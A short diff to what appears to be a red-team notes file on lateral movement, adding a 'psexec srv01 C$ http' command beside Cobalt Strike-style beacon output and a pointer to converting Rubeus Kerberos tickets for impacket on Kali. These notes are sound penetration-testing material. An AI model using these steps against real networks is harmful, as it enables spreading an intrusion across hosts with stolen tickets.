@@ -29,7 +29,10 @@ Started service dd80980 on srv-1
 [+] established link to child beacon: 10.10.17.25
 
 ```
-
+or in older versions you can use:
+```
+psexec srv01 C$ http
+```
 ### On Kali With impacket
 You need a .ccache or .kirbi ticket.
 To obtain those tickets from Rebeus: [[RubeusToCcache]]
